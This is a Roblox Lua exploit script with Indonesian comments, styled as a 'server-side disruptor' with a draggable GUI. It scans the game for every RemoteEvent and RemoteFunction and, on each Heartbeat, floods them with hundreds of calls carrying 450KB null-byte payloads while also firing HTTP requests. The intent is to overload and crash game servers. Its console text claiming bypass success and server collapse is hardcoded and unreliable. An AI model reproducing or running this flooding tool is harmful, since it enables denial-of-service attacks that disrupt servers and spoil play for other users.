-- [[ PHANTOM ULTIMATE: REALTIME SERVER-SIDE DISRUPTOR ]] --
-- Fitur: Dex Scanner + Heartbeat Jamming + HTTPS Stresser + Realtime Monitor

local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")

local isExecuting = false
local payload = string.rep("\0", 450000) -- 450KB Null-Data (Beban Berat)
local discoveredRemotes = {}

-- [[ UI CONSTRUCTION: ELITE SERVER-SIDE TERMINAL ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "PhantomServerSide"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 380, 0, 450)
Main.Position = UDim2.new(0.5, -190, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
Main.Visible = false
Instance.new("UICorner", Main)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(255, 0, 0)
Stroke.Thickness = 2

-- [[ SERVER-SIDE REALTIME MONITOR ]] --
local Monitor = Instance.new("Frame", Main)
Monitor.Size = UDim2.new(0.92, 0, 0, 180)
Monitor.Position = UDim2.new(0.04, 0, 0.05, 0)
Monitor.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Instance.new("UICorner", Monitor)

local ConsoleTxt = Instance.new("TextLabel", Monitor)
ConsoleTxt.Size = UDim2.new(1, -20, 1, -20)
ConsoleTxt.Position = UDim2.new(0, 10, 0, 10)
ConsoleTxt.BackgroundTransparency = 1
ConsoleTxt.Text = "> INITIALIZING SERVER_SIDE_LOGIC...\n> SCANNING HANDSHAKES...\n> STATUS: READY_TO_EXECUTE"
ConsoleTxt.TextColor3 = Color3.fromRGB(255, 50, 50)
ConsoleTxt.Font = Enum.Font.Code
ConsoleTxt.TextSize = 10
ConsoleTxt.TextXAlignment = Enum.TextXAlignment.Left
ConsoleTxt.TextYAlignment = Enum.TextYAlignment.Top

-- LOADING BAR (SINKRON DENGAN SERVER PROCESS)
local BarBack = Instance.new("Frame", Monitor)
BarBack.Size = UDim2.new(1, 0, 0, 4)
BarBack.Position = UDim2.new(0, 0, 1, -4)
BarBack.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

-- [[ CORE ENGINE: SERVER-SIDE MANIPULATION ]] --
local function startServerSideAttack()
    -- Pencarian Remote ala Dex (Realtime Scan)
    discoveredRemotes = {}
    for _, v in pairs(game:GetDescendants()) do
        pcall(function()
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                table.insert(discoveredRemotes, v)
            end
        end)
    end

    -- Eksekusi tepat pada siklus Heartbeat (Sinkronisasi Server)
    RunService.Heartbeat:Connect(function()
        if isExecuting then
            for i = 1, 180 do -- Intensitas Maksimal
                task.defer(function()
                    pcall(function()
                        -- Stressing Jalur Luar
                        HttpService:GetAsync("https://google.com/gen_204?nocache=" .. tick())
                        
                        -- Stressing Jalur Dalam (Remote Event)
                        for r = 1, #discoveredRemotes do
                            local target = discoveredRemotes[r]
                            if target:IsA("RemoteEvent") then
                                -- Fire dengan triple payload agar server kewalahan
                                target:FireServer(payload, payload, payload)
                            elseif target:IsA("RemoteFunction") then
                                task.spawn(function() target:InvokeServer(payload) end)
                            end
                        end
                    end)
                end)
            end
        end
    end)
end

-- [[ ANIMATION & MONITORING LOOP ]] --
task.spawn(function()
    local frames = {"◐", "◓", "◑", "◒"}
    local step = 0
    while true do
        if isExecuting then
            step = step + 1
            local char = frames[step % #frames + 1]
            ConsoleTxt.Text = string.format(
                "> EXECUTING_SERVER_SIDE %s\n> REMOTE_FOUND: %d\n> BYPASS_STATUS: SUCCESS\n> THREAD_PRESSURE: CRITICAL\n> REALTIME_TICK: %.4f\n> STATUS: SERVER_COLLAPSING...",
                char, #discoveredRemotes, tick()
            )
            BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 0.5)
            task.wait(0.5)
            BarFill.Size = UDim2.new(0, 0, 1, 0)
        else
            ConsoleTxt.Text = "> PHANTOM_OS: STANDBY\n> SERVER_LOGIC: PROTECTED\n> READY_FOR_INJECTION"
            task.wait(0.5)
        end
    end
end)

-- [[ MAIN EXECUTION BUTTON ]] --
local StartBtn = Instance.new("TextButton", Main)
StartBtn.Size = UDim2.new(0.9, 0, 0, 120)
StartBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
StartBtn.Text = "EXECUTE SERVER-SIDE"
StartBtn.TextColor3 = Color3.new(1,1,1)
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 25
Instance.new("UICorner", StartBtn)

StartBtn.MouseButton1Click:Connect(function()
    isExecuting = not isExecuting
    if isExecuting then
        StartBtn.Text = "SHUTTING DOWN..."
        StartBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        startServerSideAttack()
    else
        StartBtn.Text = "EXECUTE SERVER-SIDE"
        StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    end
end)

-- [[ TOGGLE ICON & DRAG ]] --
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 65, 0, 65)
Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
Icon.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
Icon.Image = "rbxassetid://6031094678"
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
local iStroke = Instance.new("UIStroke", Icon)
iStroke.Color = Color3.fromRGB(255, 0, 0)
iStroke.Thickness = 3

Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
local function drag(o)
    local s, i, sp
    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
end
drag(Icon); drag(Main)
